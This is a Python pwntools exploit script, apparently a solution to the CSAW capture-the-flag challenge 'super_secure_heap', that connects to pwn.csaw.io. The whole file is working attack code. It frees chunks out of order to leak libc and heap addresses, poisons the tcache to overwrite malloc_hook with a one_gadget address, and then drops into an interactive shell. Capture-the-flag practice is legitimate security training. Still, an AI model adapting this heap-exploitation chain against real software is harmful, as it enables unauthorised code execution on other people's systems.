#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template super_secure_heap
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('super_secure_heap')
ld = ELF('./ld-2.31.so')
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([ld.path,exe.path] + argv, gdbscript=gdbscript, *a, **kw, env={"LD_PRELOAD":libc.path})
    else:
        return process([ld.path,exe.path] + argv, env={"LD_PRELOAD":libc.path})

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())


def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def encodex(addr,heap):
    return addr ^ (heap>>12)
def key_add(size):
    io.sendlineafter(b'>',str(1).encode())
    io.sendlineafter(b'>',str(1).encode())
    io.sendline(str(size).encode())
    return
def key_delete(index):
    io.sendlineafter(b'>',str(1).encode())
    io.sendlineafter(b'>',str(2).encode())
    io.sendlineafter(b':',str(index).encode())
    return
def content_add(size):
    io.sendlineafter(b'>',str(2).encode())
    io.sendlineafter(b'>',str(1).encode())
    io.sendlineafter(b':',str(size).encode())
    return
def content_delete(index):
    io.sendlineafter(b'>',str(2).encode())
    io.sendlineafter(b'>',str(2).encode())
    io.sendlineafter(b':',str(index).encode())
    return
def key_modify(index,size,payload):
    io.sendline(str(1).encode())
    io.sendlineafter(b'>',str(3).encode())
    io.sendlineafter(b':',str(index).encode())
    io.sendlineafter(b':',str(size).encode())
    io.sendlineafter(b':',payload)
    return

def content_modify(index,size,payload):
    io.sendline(str(2).encode())
    io.sendlineafter(b'>',str(3).encode())
    io.sendlineafter(b':',str(index).encode())
    io.sendlineafter(b':',str(index).encode())
    io.sendlineafter(b':',str(size).encode())
    io.sendlineafter(b':',payload)
    return
def leak(index):
    io.sendlineafter(b'>',str(2).encode())
    io.sendlineafter(b'>',str(4).encode())
    io.sendlineafter(b':',str(index).encode())
    io.recvline()
    io.recvline()
    return io.recvline().split(b'Do you want')[0]

malloc_hook = 0x1ecb70
free_hook = 0x1eee48
offset = 0xb183be0-0xaf97000
one_gadget = 0xe3b01
#io = start()
io = remote('pwn.csaw.io' ,9998)
#io = remote('pwn.csaw.io' ,9998)
content_add(0x500)
content_add(0x10)
content_add(0x10)
content_add(0x500)

content_delete(0)
content_delete(1)
content_delete(2)

key_add(0x500)
key_add(0x10)
key_add(0x10)

content_delete(0)
content_delete(2)
content_delete(1)

libc_leak = leak(0)
heap_leak = leak(1)
print(libc_leak)
print(heap_leak)
heap_leak+=2*b'\x00'
libc_leak+=2*b'\x00'
libc_leak = u64(libc_leak)-offset
heap_leak = u64(heap_leak)
log.info('libc leak: {0}'.format(hex(libc_leak)))
log.info('heap leak = {0}'.format(hex(heap_leak)))
key_modify(2,0x8,p64(libc_leak+malloc_hook))

log.info('malloc hook: {0}'.format(hex(libc_leak+malloc_hook)))

#pause()

key_add(0x10)

key_add(0x10)

key_modify(4,0x9,p64(libc_leak+one_gadget))
#pause()
key_add(0x0)

io.interactive()

